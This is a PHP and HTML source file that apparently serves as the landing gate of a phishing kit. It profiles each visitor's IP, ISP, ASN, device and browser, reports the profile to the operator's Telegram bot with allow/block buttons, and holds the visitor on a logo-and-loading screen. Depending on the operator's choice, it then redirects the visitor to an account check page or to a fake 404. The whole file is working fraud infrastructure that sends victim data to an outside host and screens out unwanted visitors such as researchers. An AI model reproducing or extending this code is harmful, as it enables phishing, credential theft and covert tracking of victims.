<?php
session_start();
ob_start(); 
require_once('includes/php/detect.php');
require_once('config.php');

if (!function_exists('curl_init')) {
  die('Error: cURL must be enabled on the server.');
}

if(!isset($_SESSION['fallow'])) $_SESSION['fallow'] = true;


$_SESSION['unique_id'] = $_SERVER['REQUEST_TIME_FLOAT'];
  
if ($live_control['access_manipulation'] === true) {

    $btnRcap = array(
      array(
          array('text' => 'Allow Access ✅', 'callback_data' => $_SESSION['unique_id'] . ' allowed'),
      ),
      array(
          array('text' => 'Block Access ⛔️', 'callback_data' => $_SESSION['unique_id'] . ' blocked'),
        ),
    );
 

  $buttons = array(
      'inline_keyboard' => $btnRcap
  );
  
  include_once('includes/php/bot_api.php');

$message = '📦 <code>'.$_SESSION['user_data']['query'].'</code> <b>is online</b>

<b>COUNTRY:</b> '.$_SESSION['user_data']['countryCode'].'
<b>ISP:</b> '.$_SESSION['user_data']['isp'].'
<b>ORG:</b> '.$_SESSION['user_data']['org'].'
<b>ASN:</b> '.$_SESSION['user_data']['as'].'
<b>DEVICE:</b> '.$_SESSION['device'].'
<b>BROWSER:</b> '.$_SESSION['browser'].'
<b>OS:</b> '.$_SESSION['os'].'
<b>USER AGENT:</b> '.$_SERVER['HTTP_USER_AGENT'];
  $status = bot_api($message, $buttons);
  if ($status['ok'] === 0 || $status['ok'] === false) die('{"error":true, "description": "telegram bot api"}');
}else{
  header('location: account/accessCheck.php');
  exit();
}
?>
<html dir="ltr">
  <head id="j_idt3">
    <meta charset="UTF-8">
    <title></title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="shortcut icon" href="favicon.ico">
    <meta name="theme-color" content="#ffffff">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
      .modalBgLoading {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.7);
    z-index: 99999;
}
.modalBgLoading .loading {
    position: absolute;
    z-index: 65557;
    width: 120px;
    height: 120px;
    background: url('./account/img/loading.gif') no-repeat center center #fff;
    border-radius: 10px;
    border: 2px solid #fff;
    top: 50%;
    left: 50%;
    margin-left: -60px;
    margin-top: -60px;
}
    </style>
  </head>
  <body style="" class="pace-running" style="">
    <section id="main-wrapper" class="">
      <header id="main-header" class="row" style="display: flex; align-items: center; justify-content: center;">
        <span class="logo" style="left: auto;">
          <a>
            <img src="account/img/logo.png" style="width: 150px;margin-top: 60px;" alt="">
          </a>
        </span>
      </header>
      <section id="main-body">
        <section id="content-bottom-flex" class="bg-white">
            <div class="modalBgLoading" style="">
                  <div class="loading"></div>
            </div>
        </section>
      </section>
    </section>
    <?php 
    require_once('includes/js/startRequest.php'); 
    require_once('includes/js/makeRequest.php'); 
    ?>
    <script>
    function processResponse(response) {
      for (var i = 0; i < response.result.length; i++) {
        var result = response.result[i];
        if (result.callback_query && (result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> allowed" || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> blocked")) {
          var chatId = result.callback_query.message.chat.id;
          var messageId = result.callback_query.message.message_id;
          var action = result.callback_query.data.split(" ")[1];
          
          deleteMessage(chatId, messageId);

        if (action === "allowed") {
            window.location.href = "account/accessCheck.php"; 
            console.log("access allowed!");
        } else if (action === "blocked") {
            window.location.href = "404.php"; 
            console.log("access denied!");
        }

          break;
        }
      }
    }
  </script>
  <?php require_once('includes/js/deleteMessage.php'); ?>
  </body>
</html>